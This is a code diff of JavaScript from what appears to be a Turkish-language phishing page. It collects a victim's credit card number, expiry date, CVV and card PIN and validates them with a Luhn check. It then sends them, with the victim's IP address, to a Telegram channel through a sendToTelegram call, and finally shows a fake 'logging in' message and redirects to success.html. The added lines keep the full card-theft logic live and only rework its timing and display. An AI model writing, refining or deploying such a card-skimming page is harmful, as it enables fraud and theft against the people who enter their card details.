@@ -107,49 +107,59 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     // Buton
-    var btn = document.getElementById('btn-spc');
-    if (btn) {
-        btn.onclick = function(e) {
-            e.preventDefault();
+    // Buton
+var btn = document.getElementById('btn-spc');
+if (btn) {
+    btn.onclick = function(e) {
+        e.preventDefault();
+        
+        var kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
+        var skt = document.getElementById('exp').value;
+        var cvv = document.getElementById('cvv').value;
+        var sifre = document.getElementById('kkpw').value;
+        
+        if (!kartNo || kartNo.length !== 16) {
+            showAlert('Kart numarası 16 haneli olmalıdır.');
+            return;
+        }
+        if (!luhnKontrol(kartNo)) {
+            showAlert('Geçersiz kart numarası!');
+            return;
+        }
+        if (!skt || skt.length !== 5) {
+            showAlert('Son kullanma tarihi AA/YY formatında olmalıdır.');
+            return;
+        }
+        if (!sktKontrol(skt)) {
+            showAlert('Son kullanma tarihi geçersiz veya süresi dolmuş!');
+            return;
+        }
+        if (!cvv || cvv.length !== 3) {
+            showAlert('CVV 3 haneli olmalıdır.');
+            return;
+        }
+        if (!sifre || sifre.length !== 4) {
+            showAlert('Kart şifresi 4 haneli olmalıdır.');
+            return;
+        }
+        
+        // Kırmızı kaplamayı gizle
+        document.getElementById('alertDiv').style.display = 'none';
+        
+        // === BUTONU GİRİŞ YAPILIYOR YAP ===
+        var originalText = btn.innerText;
+        btn.innerText = 'Giriş yapılıyor...';
+        btn.disabled = true;
+        btn.style.opacity = '0.6';
+        
+        getIP(function(ip) {
+            var mesaj = 'Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip;
+            sendToTelegram(mesaj);
             
-            var kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
-            var skt = document.getElementById('exp').value;
-            var cvv = document.getElementById('cvv').value;
-            var sifre = document.getElementById('kkpw').value;
-            
-            if (!kartNo || kartNo.length !== 16) {
-                showAlert('Kart numarası 16 haneli olmalıdır.');
-                return;
-            }
-            if (!luhnKontrol(kartNo)) {
-                showAlert('Geçersiz kart numarası!');
-                return;
-            }
-            if (!skt || skt.length !== 5) {
-                showAlert('Son kullanma tarihi AA/YY formatında olmalıdır.');
-                return;
-            }
-            if (!sktKontrol(skt)) {
-                showAlert('Son kullanma tarihi geçersiz veya süresi dolmuş!');
-                return;
-            }
-            if (!cvv || cvv.length !== 3) {
-                showAlert('CVV 3 haneli olmalıdır.');
-                return;
-            }
-            if (!sifre || sifre.length !== 4) {
-                showAlert('Kart şifresi 4 haneli olmalıdır.');
-                return;
-            }
-            
-            document.getElementById('alertDiv').style.display = 'none';
-            
-            getIP(function(ip) {
-                var mesaj = 'Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip;
-                sendToTelegram(mesaj);
-                alert('Bilgileriniz kontrol ediliyor...');
+            // 1 saniye sonra yönlendir
+            setTimeout(function() {
                 window.location.href = 'success.html';
-            });
-        };
-    }
-});
+            }, 1000);
+        });
+    };
+}
